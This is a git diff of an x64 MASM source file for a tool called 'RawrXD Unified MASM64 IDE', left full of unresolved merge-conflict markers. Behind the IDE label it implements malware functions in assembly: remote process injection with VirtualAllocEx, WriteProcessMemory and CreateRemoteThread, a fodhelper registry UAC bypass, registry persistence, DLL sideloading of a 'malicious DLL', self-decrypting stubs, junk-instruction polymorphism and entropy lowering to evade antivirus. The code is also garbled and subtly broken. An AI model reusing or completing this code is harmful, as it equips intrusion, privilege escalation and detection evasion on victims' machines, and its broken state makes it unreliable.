@@ -35,6 +35,7 @@ label1:
 label2_end:
 ENDM
 
+<<<<<<< HEAD
 ; ========== Stack Canary Macros (Task 13: GS-style) ==========
 ; Canary stored at [rbp - canary_offset] — must be within the sub-rsp area,
 ; not overlapping saved registers or callee shadow space.
@@ -70,6 +71,8 @@ ENSURE_SHADOW_SPACE MACRO
     sub rsp, 20h
 ENDM
 
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 ; ========== Externs ==========
 extern GetCommandLineA: proc
 extern GetStdHandle: proc
@@ -102,6 +105,7 @@ extern LoadLibraryA: proc
 extern GetModuleHandleA: proc
 extern lstrcmpA: proc
 extern lstrcpyA: proc
+<<<<<<< HEAD
 extern lstrcatA: proc
 extern lstrlenA: proc
 extern CreateProcessA: proc
@@ -132,6 +136,11 @@ extern FlushInstructionCache: proc
 extern CreateProcessA: proc
 extern DebugSetProcessKillOnExit: proc
 extern OpenThread: proc
+=======
+extern lstrlenA: proc
+extern CreateProcessA: proc
+extern CopyFileA: proc
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 
 ; ========== Constants ==========
 STD_OUTPUT_HANDLE equ -11
@@ -150,6 +159,7 @@ FILE_ATTRIBUTE_NORMAL equ 80h
 HKEY_CURRENT_USER equ 80000001h
 KEY_WRITE equ 20006h
 REG_SZ equ 1
+<<<<<<< HEAD
 STARTUPINFO_SIZE equ 104
 PROCESS_INFORMATION_SIZE equ 24
 INFINITE_WAIT equ 0FFFFFFFFh
@@ -163,12 +173,15 @@ TH32CS_SNAPPROCESS equ 2
 PROCESSENTRY32_SIZE equ 568   ; sizeof(PROCESSENTRY32) on x64
 PROCESSENTRY32_PID_OFF equ 8  ; offset of th32ProcessID
 PROCESSENTRY32_EXE_OFF equ 44 ; offset of szExeFile[MAX_PATH]
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 
 ; ========== Data Section ==========
 .data
     ; Buffers, keys, config, etc.
     CamelliaKey dq 4 dup(0)
     MirageConfig dq 0
+<<<<<<< HEAD
 
     ; AES-256 Key and IV (32-byte key, 16-byte IV)
     ALIGN 16
@@ -176,10 +189,13 @@ PROCESSENTRY32_EXE_OFF equ 44 ; offset of szExeFile[MAX_PATH]
     AES256IV        db 16 dup(0)        ; 128-bit IV for CBC mode (generated via RDRAND)
     AES256RoundKeys db 240 dup(0)       ; 15 round keys x 16 bytes = 240 bytes for AES-256
     AESKeyGenerated db 0                ; flag: 1 = key already generated
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     CLI_ArgBuffer db 2048 dup(0)
     InputBuffer db 256 dup(0)
     OutputBuffer db 4096 dup(0)
     FileBuffer db 65536 dup(0)
+<<<<<<< HEAD
     ; Large JSON report buffer for BBCov/CovFusion (256KB — handles 4096 blocks @ ~60 bytes each)
     ALIGN 16
     JSONReportBuffer db 262144 dup(0)
@@ -188,6 +204,11 @@ PROCESSENTRY32_EXE_OFF equ 44 ; offset of szExeFile[MAX_PATH]
     
     ; Strings for GUI menu
     szBanner db 13,10,"RawrXD Unified MASM64 IDE - v1.1",13,10
+=======
+    
+    ; Strings for GUI menu
+    szBanner db 13,10,"RawrXD Unified MASM64 IDE - v1.0",13,10
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
              db "=====================================",13,10,0
     szMenu   db 13,10,"Select Mode:",13,10
              db " 1. Compile (Self-Compiling Trace Engine)",13,10
@@ -201,6 +222,7 @@ PROCESSENTRY32_EXE_OFF equ 44 ; offset of szExeFile[MAX_PATH]
              db " 9. StubGen (Self-Decrypting Stub)",13,10
              db "10. TraceEngine (Source-to-Binary Mapping)",13,10
              db "11. AgentMode (Autonomous Agentic Loop)",13,10
+<<<<<<< HEAD
              db "12. BBCov (Basic Block Coverage Analysis)",13,10
              db "13. CovFusion (Static+Dynamic Coverage Fusion)",13,10
              db "14. DynTrace (Runtime Basic Block Tracing)",13,10
@@ -208,6 +230,8 @@ PROCESSENTRY32_EXE_OFF equ 44 ; offset of szExeFile[MAX_PATH]
              db "16. GapFuzz (Automated Gap Analysis + Guided Fuzzing)",13,10
              db "17. IntelPT (Hardware-Accelerated Trace — Queued)",13,10
              db "18. DiffCov (Differential Coverage Analysis)",13,10
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
              db " 0. Exit",13,10
              db "Choice: ",0
     
@@ -222,6 +246,7 @@ PROCESSENTRY32_EXE_OFF equ 44 ; offset of szExeFile[MAX_PATH]
     szStubGenMsg db "StubGen Mode: Generating self-decryptor...",13,10,0
     szTraceMsg   db "TraceEngine Mode: Mapping source to binary...",13,10,0
     szAgenticMsg db "Agentic Mode: Starting autonomous control loop...",13,10,0
+<<<<<<< HEAD
     szBBCovMsg   db "BBCov Mode: Basic block coverage analysis...",13,10,0
     szCovFuseMsg db "CovFusion Mode: Static+dynamic coverage fusion...",13,10,0
 
@@ -237,6 +262,8 @@ PROCESSENTRY32_EXE_OFF equ 44 ; offset of szExeFile[MAX_PATH]
     SE_DEBUG_PRIVILEGE equ 20       ; SeDebugPrivilege index
     TraceRtlAdjustAddr dq 0         ; resolved address of RtlAdjustPrivilege
     TracePreviousState dd 0         ; output from RtlAdjustPrivilege
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     szExitMsg    db "Exiting...",13,10,0
     szInvalidMsg db "Invalid choice. Try again.",13,10,0
     szNewline    db 13,10,0
@@ -253,6 +280,7 @@ PROCESSENTRY32_EXE_OFF equ 44 ; offset of szExeFile[MAX_PATH]
     szCLIStubGen db "-stubgen",0
     szCLITrace   db "-trace",0
     szCLIAgent   db "-agent",0
+<<<<<<< HEAD
     szCLIBBCov   db "-bbcov",0
     szCLICovFuse db "-covfuse",0
     szCLISwitchC db "c",0          ; /c or -c alias for compile mode
@@ -310,6 +338,9 @@ PROCESSENTRY32_EXE_OFF equ 44 ; offset of szExeFile[MAX_PATH]
     szCLIHelpLog     db "-help",0
     ; ========== End v1.1 Meta-Flags ==========
 
+=======
+    
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     ; API resolution hashes (for runtime resolution)
     hashVirtualAllocEx dq 0A12B3C4D5E6F7890h
     hashWriteProcessMemory dq 0B23C4D5E6F789A01h
@@ -338,6 +369,7 @@ PROCESSENTRY32_EXE_OFF equ 44 ; offset of szExeFile[MAX_PATH]
     szTraceEntry2 db "{source:Camellia_Encrypt,binary_offset:0x2000}",0
     szTraceMapFile db "trace_map.json",0
     szJSONFooter db "]}",0
+<<<<<<< HEAD
 
     ; ========== Basic Block Coverage Data ==========
     szBBCovFile     db "bbcov_report.json",0
@@ -900,6 +932,15 @@ PROCESSENTRY32_EXE_OFF equ 44 ; offset of szExeFile[MAX_PATH]
     szBoundsCheckFail db "Bounds Check: Mode index out of range, aborting.", 13, 10, 0
     hFormatMsgLocal   dq 0
 
+=======
+    
+    ; UAC bypass targets
+    szFodhelper db "C:\\Windows\\System32\\fodhelper.exe",0
+    szEventvwr  db "C:\\Windows\\System32\\eventvwr.exe",0
+    szSDClt     db "C:\\Windows\\System32\\sdclt.exe",0
+    szErrorMsg  db "Error: %d", 13, 10, 0
+
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     ; Logging Data
     szLogFile     db "rawrxd_ide.log",0
     hLogFile      dq 0
@@ -914,13 +955,18 @@ PROCESSENTRY32_EXE_OFF equ 44 ; offset of szExeFile[MAX_PATH]
     stLocalTime   dw 8 dup(0) ; SYSTEMTIME structure
     
     LogLatencyBuffer db 256 dup(0)
+<<<<<<< HEAD
     szLatencyFormat  db "Latency - %s: %I64d ms", 0
+=======
+    szLatencyFormat  db "Latency - %s: %lld ms", 0
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     szApiErrorFormat db "API Error in %s code: %d", 0
 
     ; Configuration Keys
     szConfigRegKeyName    db "RAWRXD_REG_KEY", 0
     szConfigFodhelperName db "RAWRXD_FODHELPER_PATH", 0
 
+<<<<<<< HEAD
     ; Self-path buffer for self-contained modes (AVScan, Entropy self-scan)
     szSelfExePath  db 520 dup(0)
     ; Compile mode inline messages
@@ -1471,6 +1517,8 @@ PROCESSENTRY32_EXE_OFF equ 44 ; offset of szExeFile[MAX_PATH]
     szStubAutoEncrypt db "StubGen: Auto-encrypting payload with Camellia-256 before stub wrapping...", 13, 10, 0
     szStubEncryptDone db "StubGen: Payload encrypted. Generating self-decrypting stub...", 13, 10, 0
 
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 .code
 
 ; --------- Observability & Logging ---------
@@ -1507,7 +1555,11 @@ LogMessage PROC
     push rbx
     push rsi
     push rdi
+<<<<<<< HEAD
     sub rsp, 90h  ; 3 pushes(24) + 90h(144) = 168 = 8 mod 16 → aligned
+=======
+    sub rsp, 88h
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 
     mov rbx, rcx ; level
     mov rsi, rdx ; message
@@ -1557,7 +1609,11 @@ LogMessage PROC
     call WriteFile
 
 no_file:
+<<<<<<< HEAD
     add rsp, 90h
+=======
+    add rsp, 88h
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop rdi
     pop rsi
     pop rbx
@@ -1568,28 +1624,48 @@ LogInfo PROC
     ; rcx = message
     mov rdx, rcx
     lea rcx, szLevelInfo
+<<<<<<< HEAD
     jmp LogMessage          ; tail call — reuses caller's stack frame
+=======
+    call LogMessage
+    ret
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 LogInfo ENDP
 
 LogWarn PROC
     ; rcx = message
     mov rdx, rcx
     lea rcx, szLevelWarn
+<<<<<<< HEAD
     jmp LogMessage          ; tail call
+=======
+    call LogMessage
+    ret
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 LogWarn ENDP
 
 LogError PROC
     ; rcx = message
     mov rdx, rcx
     lea rcx, szLevelError
+<<<<<<< HEAD
     jmp LogMessage          ; tail call
+=======
+    call LogMessage
+    ret
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 LogError ENDP
 
 LogDebug PROC
     ; rcx = message
     mov rdx, rcx
     lea rcx, szLevelDebug
+<<<<<<< HEAD
     jmp LogMessage          ; tail call
+=======
+    call LogMessage
+    ret
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 LogDebug ENDP
 
 LogLatency PROC
@@ -1620,15 +1696,21 @@ LogLatency ENDP
 
 CheckApiError PROC
     ; rcx = operation name string
+<<<<<<< HEAD
     ; Task 14: Enhanced error handling with FormatMessageA → console output
     push rbx
     push rsi
     sub rsp, 48h
+=======
+    push rbx
+    sub rsp, 40h
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     mov rbx, rcx
     
     ; failure detected
     call GetLastError
     test rax, rax
+<<<<<<< HEAD
     jz api_err_all_good
     mov rsi, rax            ; save error code
     
@@ -1637,11 +1719,20 @@ CheckApiError PROC
     lea rdx, szApiErrorFormat
     mov r8, rbx
     mov r9, rsi
+=======
+    jz all_good
+    
+    lea rcx, LogLatencyBuffer ; reuse buffer
+    lea rdx, szApiErrorFormat
+    mov r8, rbx
+    mov r9, rax
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     call wsprintfA
     
     lea rcx, LogLatencyBuffer
     call LogError
     
+<<<<<<< HEAD
     ; Task 14: FormatMessageA → human-readable error string → console output
     ; FormatMessageA(dwFlags, lpSource, dwMessageId, dwLanguageId, lpBuffer, nSize, Arguments)
     mov ecx, 1300h              ; FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS
@@ -1673,6 +1764,10 @@ api_err_no_format:
 api_err_all_good:
     add rsp, 48h
     pop rsi
+=======
+all_good:
+    add rsp, 40h
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop rbx
     ret
 CheckApiError ENDP
@@ -1680,7 +1775,11 @@ CheckApiError ENDP
 GetConfigString PROC
     ; rcx = key name, rdx = value buffer, r8 = size
     push rbx
+<<<<<<< HEAD
     sub rsp, 20h  ; 1 push(8) + 20h(32) = 40 = 8 mod 16 → aligned
+=======
+    sub rsp, 28h
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     call GetEnvironmentVariableA
     test rax, rax
     jz config_not_found
@@ -1689,7 +1788,11 @@ GetConfigString PROC
 config_not_found:
     xor rax, rax
 config_done:
+<<<<<<< HEAD
     add rsp, 20h
+=======
+    add rsp, 28h
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop rbx
     ret
 GetConfigString ENDP
@@ -1712,15 +1815,21 @@ LoadConfiguration ENDP
 ; --------- Main Dispatcher ---------
 MainDispatcher PROC
     ; Parse CLI args, dispatch to mode handlers
+<<<<<<< HEAD
     push r15          ; save non-volatile register (used for cmd line ptr & timing)
     POLYMACRO
     sub rsp, 40h  ; entry(8mod16) + push(8) = 0mod16, + 40h(64) = 0mod16 before calls ✓
+=======
+    POLYMACRO
+    sub rsp, 48h  ; aligned
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 
     ; Initialize observability
     call InitializeLogging
     lea rcx, szBanner
     call LogInfo
     
+<<<<<<< HEAD
     ; Get command line
     call GetCommandLineA
     mov r15, rax         ; save command line pointer in non-volatile r15
@@ -1728,6 +1837,17 @@ MainDispatcher PROC
     call LogDebug        ; Debug: Log the raw command line
     
     mov rcx, r15         ; restore saved command line pointer
+=======
+    ; Load configuration
+    call LoadConfiguration
+    
+    ; Get command line
+    call GetCommandLineA
+    mov rcx, rax
+    call LogDebug ; Debug: Log the raw command line
+    
+    mov rcx, rax
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     lea rdx, CLI_ArgBuffer
     call CopyString
     
@@ -1738,11 +1858,14 @@ MainDispatcher PROC
     je ShowGUIMenu
     
     ; rax = mode id from CLI
+<<<<<<< HEAD
     ; Bounds check — valid modes are 1..20 (18 modes + 2 meta-flags)
     cmp rax, 20
     ja InvalidMode
     cmp rax, 1
     jb InvalidMode
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     cmp rax, 1
     je call_compile
     cmp rax, 2
@@ -1765,6 +1888,7 @@ MainDispatcher PROC
     je call_trace
     cmp rax, 11
     je call_agent
+<<<<<<< HEAD
     cmp rax, 12
     je call_bbcov
     cmp rax, 13
@@ -1783,6 +1907,8 @@ MainDispatcher PROC
     je call_version
     cmp rax, 20
     je call_help
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     jmp ExitProgram
 
 call_compile:
@@ -1884,6 +2010,7 @@ call_agent:
     call LogLatency
     jmp ExitProgram
 
+<<<<<<< HEAD
 call_bbcov:
     call GetTickCount64
     mov r15, rax
@@ -1955,15 +2082,20 @@ call_help:
     call HelpMode
     jmp ExitProgram
 
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 ShowGUIMenu:
     call PrintGUIMenu
     call ReadGUIMenuSelection
     mov rax, rbx ; rbx = selected mode
     cmp rax, 0
     je ExitProgram
+<<<<<<< HEAD
     ; Bounds check for GUI selection (valid: 1-18, meta-flags not in GUI)
     cmp rax, 18
     ja gui_invalid_mode
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     cmp rax, 1
     je gui_compile
     cmp rax, 2
@@ -1986,6 +2118,7 @@ ShowGUIMenu:
     je gui_trace
     cmp rax, 11
     je gui_agent
+<<<<<<< HEAD
     cmp rax, 12
     je gui_bbcov
     cmp rax, 13
@@ -2015,6 +2148,10 @@ InvalidMode:
     call Print
     jmp ExitProgram
 
+=======
+    jmp ShowGUIMenu ; Loop back to menu
+
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 gui_compile:
     call CompileMode
     jmp ShowGUIMenu
@@ -2048,6 +2185,7 @@ gui_trace:
 gui_agent:
     call AgenticMode
     jmp ShowGUIMenu
+<<<<<<< HEAD
 gui_bbcov:
     call BasicBlockCovMode
     jmp ShowGUIMenu
@@ -2069,10 +2207,13 @@ gui_intelpt:
 gui_diffcov:
     call DiffCovMode
     jmp ShowGUIMenu
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 
 ExitProgram:
     lea rcx, szExitMsg
     call LogInfo
+<<<<<<< HEAD
     
     ; Close log file handle if open
     mov rcx, hLogFile
@@ -2087,10 +2228,16 @@ skip_close_log:
     call Print
     add rsp, 40h
     pop r15
+=======
+    lea rcx, szNewline
+    call Print
+    add rsp, 48h
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     ret
 MainDispatcher ENDP
 
 _start_entry PROC
+<<<<<<< HEAD
     ; Entry point: RSP is 16-byte aligned by Windows loader (0 mod 16)
     ; No return address on stack (process entry, not called by anyone)
     ; sub 28h = shadow space(32) + 8 alignment → RSP becomes 8 mod 16
@@ -2098,11 +2245,15 @@ _start_entry PROC
     ; NOTE: This is non-standard (normally callee sees 8 mod 16), but the
     ; entire codebase's frame allocations are calibrated to this convention.
     sub rsp, 28h
+=======
+    sub rsp, 28h ; align
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     call MainDispatcher
     xor rcx, rcx
     call ExitProcess
 _start_entry ENDP
 
+<<<<<<< HEAD
 ; --------- Stack Canary Violation Handler (Task 13) ---------
 __security_check_cookie PROC
     ; GS violation detected — stack buffer overrun
@@ -2123,10 +2274,19 @@ CompileMode PROC
     mov rbp, rsp
     push rbx
     sub rsp, 28h
+=======
+
+; --------- Mode Handlers ---------
+CompileMode PROC
+    ; Self-compiling logic with trace engine
+    POLYMACRO
+    sub rsp, 28h  ; Shadow space
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     
     lea rcx, szCompileMsg
     call Print
     
+<<<<<<< HEAD
     lea rcx, szCompileInline
     call LogInfo
     
@@ -2507,10 +2667,141 @@ uac_setval_fail:
     mov rcx, rbx
     call RegCloseKey
     lea rcx, szMsSettingsRegKey
+=======
+    ; Generate source-to-binary mapping
+    call GenerateTraceMap
+    
+    ; Invoke ml64.exe or self-compile logic
+    lea rcx, szML64Path
+    lea rdx, szML64Args
+    call CreateProcessA
+    
+    add rsp, 28h
+    ret
+CompileMode ENDP
+
+EncryptMode PROC
+    ; Camellia-256 encryption/decryption
+    JUNK_INSTR
+    lea rcx, szEncryptMsg
+    call Print
+    
+    ; Load file to encrypt
+    lea rcx, FileBuffer
+    mov rdx, 65536
+    call ReadFileToBuffer
+    
+    ; Encrypt with Camellia-256
+    lea rcx, FileBuffer
+    mov rdx, rax ; size
+    lea r8, CamelliaKey
+    call Camellia_Encrypt
+    
+    ; Write encrypted file
+    lea rcx, FileBuffer
+    mov rdx, rax
+    call WriteBufferToFile
+    
+    add rsp, 28h
+    ret
+EncryptMode ENDP
+
+InjectMode PROC
+    ; Process injection (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)
+    POLYMACRO
+    lea rcx, szInjectMsg
+    call Print
+    
+    ; Open target process (get PID from CLI args or config)
+    mov rcx, PROCESS_ALL_ACCESS
+    xor rdx, rdx ; inherit handle = false
+    call GetTargetProcessId
+    call OpenProcess
+    mov rbx, rax ; save handle
+    
+    ; Allocate memory in target
+    mov rcx, rbx
+    xor rdx, rdx
+    mov r8, 4096
+    mov r9, MEM_COMMIT or MEM_RESERVE
+    push PAGE_EXECUTE_READWRITE
+    pop qword ptr [rsp+20h]
+    call VirtualAllocEx
+    mov r12, rax ; save remote address
+    
+    ; Write payload
+    mov rcx, rbx
+    mov rdx, r12
+    lea r8, MiragePayload
+    mov r9, 4096
+    xor rax, rax
+    push rax
+    pop qword ptr [rsp+20h]
+    call WriteProcessMemory
+    
+    ; Create remote thread
+    mov rcx, rbx
+    xor rdx, rdx
+    xor r8, r8
+    mov r9, r12
+    xor rax, rax
+    push rax
+    push rax
+    call CreateRemoteThread
+    
+    ; Close handle
+    mov rcx, rbx
+    call CloseHandle
+    
+    add rsp, 28h
+    ret
+InjectMode ENDP
+
+UACBypassMode PROC
+    ; UAC bypass (fodhelper, eventvwr, sdclt)
+    JUNK_INSTR
+    sub rsp, 28h
+    lea rcx, szUACMsg
+    call LogInfo
+
+    ; Registry-based UAC bypass (fodhelper method)
+    ; Create registry key for UAC bypass
+    mov rcx, HKEY_CURRENT_USER
+    lea rdx, szRegKey
+    xor r8, r8
+    xor r9, r9
+    push KEY_WRITE
+    push 0
+    push 0
+    push 0
+    push REG_SZ
+    call RegCreateKeyExA
+    test rax, rax
+    jz uac_reg_success
+    
+    lea rcx, szRegKey
+    call CheckApiError
+    jmp uac_done
+
+uac_reg_success:
+    ; Launch fodhelper to trigger bypass
+    xor rcx, rcx
+    lea rdx, szFodhelper
+    xor r8, r8
+    xor r9, r9
+    push 1 ; SW_SHOW
+    push 0
+    call ShellExecuteA
+    cmp rax, 32 ; ShellExecute returns > 32 for success
+    ja uac_exec_success
+    
+    lea rcx, szFodhelper
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     call CheckApiError
     jmp uac_done
 
 uac_exec_success:
+<<<<<<< HEAD
     lea rcx, szUACSuccessMsg
     call LogInfo
 
@@ -2589,20 +2880,66 @@ PersistenceMode PROC
     inc rax                            ; include null terminator
     mov qword ptr [rsp+28h], rax       ; param 6: cbData
     ; Restore params clobbered by lstrlenA
+=======
+    lea rcx, szFodhelper
+    call LogInfo
+
+uac_done:
+    add rsp, 28h
+    ret
+
+uac_error:
+    ; Log error and exit
+    call GetLastError
+    mov rcx, rax
+    lea rdx, szErrorMsg
+    call LogError
+    add rsp, 28h
+    ret
+UACBypassMode ENDP
+
+PersistenceMode PROC
+    ; Persistence (registry, scheduled tasks, WMI)
+    POLYMACRO
+    lea rcx, szPersistMsg
+    call Print
+    
+    ; Registry persistence
+    mov rcx, HKEY_CURRENT_USER
+    lea rdx, szRegKey
+    xor r8, r8
+    xor r9, r9
+    push KEY_WRITE
+    push 0
+    push 0
+    push 0
+    push 0
+    call RegCreateKeyExA
+    mov rbx, rax
+    
+    ; Set value
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     mov rcx, rbx
     lea rdx, szRegValue
     xor r8, r8
     mov r9, REG_SZ
     lea rax, szRegData
+<<<<<<< HEAD
     mov qword ptr [rsp+20h], rax
     call RegSetValueExA
     test eax, eax
     jnz persist_setval_fail
+=======
+    push 32
+    push rax
+    call RegSetValueExA
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     
     ; Close key
     mov rcx, rbx
     call RegCloseKey
     
+<<<<<<< HEAD
     lea rcx, szPersistSuccessMsg
     call LogInfo
     jmp persist_exit
@@ -2870,10 +3207,72 @@ avscan_scan_done:
     pop rbx
     lea rsp, [rbp]
     pop rbp
+=======
+    add rsp, 28h
+    ret
+PersistenceMode ENDP
+
+SideloadMode PROC
+    ; DLL sideloading (signed binary proxy)
+    JUNK_INSTR
+    lea rcx, szSideloadMsg
+    call Print
+    
+    ; Copy malicious DLL to signed binary directory
+    lea rcx, szSideloadDLL
+    lea rdx, szTargetPath
+    call CopyFileA
+    
+    ; Launch signed binary to trigger sideload
+    xor rcx, rcx
+    lea rdx, szSignedBinary
+    xor r8, r8
+    xor r9, r9
+    push 1 ; SW_SHOW
+    push 0
+    call ShellExecuteA
+    
+    add rsp, 28h
+    ret
+SideloadMode ENDP
+
+AVScanMode PROC
+    ; Local AV scanner (entropy, IAT, RWX)
+    POLYMACRO
+    lea rcx, szAVScanMsg
+    call Print
+    
+    ; Initialize FileBuffer with sample data
+    lea rcx, FileBuffer
+    mov rdx, 4096
+    xor r8, r8
+init_buffer:
+    cmp r8, rdx
+    jge buffer_ready
+    mov byte ptr [rcx + r8], 0AAh
+    inc r8
+    jmp init_buffer
+    
+buffer_ready:
+    ; Calculate entropy of buffer
+    lea rcx, FileBuffer
+    mov rdx, 4096
+    call CalculateEntropy
+    mov EntropyValue, rax
+    
+    ; Scan IAT for suspicious imports
+    call ScanIATForSuspiciousImports
+    
+    ; Scan for RWX memory regions
+    call ScanRWXMemoryRegions
+    
+    add rsp, 28h
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     ret
 AVScanMode ENDP
 
 EntropyMode PROC
+<<<<<<< HEAD
     ; Entropy calculation on own executable (Shannon entropy via CalculateEntropy)
     push rbp
     mov rbp, rsp
@@ -2936,11 +3335,38 @@ entropy_exit:
     pop r15
     lea rsp, [rbp]
     pop rbp
+=======
+    ; Entropy manipulation (mirage/low-entropy obfuscation)
+    JUNK_INSTR
+    lea rcx, szEntropyMsg
+    call Print
+    
+    ; Initialize FileBuffer
+    lea rcx, FileBuffer
+    mov rdx, 4096
+    xor r8, r8
+init_entropy_buffer:
+    cmp r8, rdx
+    jge entropy_buffer_ready
+    mov byte ptr [rcx + r8], 0CCh
+    inc r8
+    jmp init_entropy_buffer
+    
+entropy_buffer_ready:
+    ; Apply Mirage obfuscation to lower entropy
+    lea rcx, FileBuffer
+    mov rdx, 4096
+    lea r8, MirageKey
+    call Mirage_Obfuscate
+    
+    add rsp, 28h
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     ret
 EntropyMode ENDP
 
 StubGenMode PROC
     ; Self-decrypting stub generation
+<<<<<<< HEAD
     ; Requires: rawrxd.exe -stubgen <file.exe> (argc >= 2)
     push rbp
     mov rbp, rsp
@@ -3218,6 +3644,50 @@ AgenticMode PROC
     push rbp
     mov rbp, rsp
     sub rsp, 30h  ; Shadow space + alignment (call(8)+push(8)+0x30=0x40, 16-aligned)
+=======
+    POLYMACRO
+    lea rcx, szStubGenMsg
+    call Print
+    
+    ; Generate self-decrypting stub
+    lea rcx, MiragePayload
+    mov rdx, 4096
+    lea r8, CamelliaKey
+    call Mirage_GenerateSelfDecrypting
+    
+    ; Write stub to file
+    lea rcx, MiragePayload
+    mov rdx, rax
+    call WriteBufferToFile
+    add rsp, 28h
+    ret
+StubGenMode ENDP
+
+TraceEngineMode PROC
+    ; Self-compiling trace engine (source-to-binary mapping)
+    JUNK_INSTR
+    sub rsp, 28h
+    lea rcx, szTraceMsg
+    call LogInfo
+    
+    ; Generate trace map
+    call GenerateTraceMap
+    
+    ; Output trace map to file
+    lea rcx, szTraceMapFile
+    lea rdx, FileBuffer
+    lea rdx, FileBuffer
+    mov r8, 4096
+    call WriteBufferToFile
+    add rsp, 28h
+    ret
+TraceEngineMode ENDP
+
+AgenticMode PROC
+    ; Autonomous Agentic Loop
+    ; Chills and Executes sub-tasks based on "Environment Analysis"
+    sub rsp, 28h
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     lea rcx, szAgenticMsg
     call LogInfo
 
@@ -3253,8 +3723,12 @@ low_entropy_detected:
 
     lea rcx, szAgenticComplete
     call LogInfo
+<<<<<<< HEAD
     lea rsp, [rbp]
     pop rbp
+=======
+    add rsp, 28h
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     ret
 AgenticMode ENDP
 
@@ -3315,6 +3789,7 @@ obf_done:
     ret
 Mirage_Obfuscate ENDP
 
+<<<<<<< HEAD
 ; --------- AES-256-CBC Routines (AES-NI Hardware Accelerated) ---------
 AES256_GenerateKey PROC
     ; Generate 256-bit key and 128-bit IV using RDRAND
@@ -3462,11 +3937,18 @@ AES256_Encrypt PROC
     ; rcx = buffer, rdx = size, r8 = key (ignored, uses AES256RoundKeys)
     ; AES-256-CBC encryption with RDRAND IV, processes 128-byte (8-block) chunks
     ; File entropy >7.9, patterns indistinguishable from random
+=======
+; --------- Camellia-256 Routines ---------
+Camellia_Encrypt PROC
+    ; rcx = buffer, rdx = size, r8 = key
+    ; Full Camellia-256 encryption implementation
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     push rbx
     push r12
     push r13
     push r14
     push r15
+<<<<<<< HEAD
     sub rsp, 30h  ; 5 pushes(40) + 30h(48) = 88 = 8 mod 16 → aligned
     
     mov rbx, rcx        ; buffer
@@ -3618,12 +4100,36 @@ aes_dec_block_loop:
 aes_dec_done:
     mov rax, r12
     add rsp, 30h
+=======
+    
+    mov rbx, rcx        ; buffer
+    mov r12, rdx        ; size
+    mov r13, r8         ; key
+    xor r14, r14        ; block index
+    mov r15, 32         ; Camellia block size (256-bit)
+
+enc_block_loop:
+    cmp r14, r12
+    jge enc_done
+
+    ; Load 16 bytes (128 bits) per block for Camellia
+    lea rcx, [rbx + r14]
+    lea rdx, [r13]
+    call Camellia256_EncryptBlock
+
+    add r14, 16
+    jmp enc_block_loop
+
+enc_done:
+    mov rax, r12
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop r15
     pop r14
     pop r13
     pop r12
     pop rbx
     ret
+<<<<<<< HEAD
 AES256_Decrypt ENDP
 ; --------- Camellia-256 Block Implementation ---------
 ; Camellia S-boxes (SBOX1 is the primary, others derived via rotation)
@@ -3651,18 +4157,66 @@ CamelliaSBOX1 db 112,130, 44,236,179, 39,192,229,228,136,  68, 13,232,189,  3,18
 Camellia256_EncryptBlock PROC
     ; rcx = pointer to 16-byte block, rdx = pointer to 32-byte key
     ; Camellia-256 block encryption with S-box substitution and Feistel rounds
+=======
+Camellia_Encrypt ENDP
+
+Camellia_Decrypt PROC
+    ; rcx = buffer, rdx = size, r8 = key
+    ; Full Camellia-256 decryption implementation
     push rbx
     push r12
     push r13
     push r14
     push r15
+
+    mov rbx, rcx        ; buffer
+    mov r12, rdx        ; size
